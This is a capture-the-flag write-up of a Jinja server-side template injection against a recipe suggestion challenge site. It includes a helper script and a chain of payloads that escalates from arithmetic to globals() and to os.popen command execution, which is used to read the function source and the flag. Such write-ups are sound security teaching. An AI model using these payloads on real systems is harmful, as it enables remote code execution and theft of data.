# WM04
> 250pts

## Briefing
> Visit the Italian dish suggestion site at https://cfta-wm04.allyourbases.co and find a way to get the flag.

## Solution
I tried to enter various command injection characters to no avail. When I entered `{{}}`, injection for a jinja template, the server seemed to error because the output from the previous search didn't change. To get more detail, I wrote a little python script to make POSTing that data and getting the raw JSON back easier. It's not strictly necessary: just `curl` with `-d` could be used.
```py
import requests
import json
import readline

def pp_json(json_thing, sort=True, indents=4):
    if type(json_thing) is str:
        print(json.dumps(json.loads(json_thing), sort_keys=sort, indent=indents))
    else:
        print(json.dumps(json_thing, sort_keys=sort, indent=indents))
    return None

url = "https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wm04"

while True:
    obj = {"search": input(">>> ")}

    x = requests.post(url, json=obj)
    pp_json(x.text)
```
Here's a proof of concept that the Jinja injection works.
```console
>>> {{6+6}}
{"body": "\n            <p>Sorry, couldn't find any suggestions containing: 12</p>\n            <p>Please try again</p>\n            ",
```
One thing I could try to do is gain a shell. One method of doing this, when you have some python injection, is to use `globals()`. Let's take a look.
```console
>>> {{globals()}}
{
    "body": "\n            <p>Sorry, couldn't find any suggestions containing: {'__name__': 'jinja2.runtime', '__doc__': 'The runtime functions and state used by compiled templates.', '__package__':
```
Looks like we have access to that. Now, can we execute commands?
```console
>>> {{globals().__builtins__.__import__("os").popen("id").read()}}
{
    "body": "\n            <p>Sorry, couldn't find any suggestions containing: uid=993(sbx_user1051)
```
Yes we can! By printing the source of the challenge using `popen("cat lambda_function.py")`, I was able to obtain the flag.

## Flag
Flag: `t3mpl4te_vu1n`
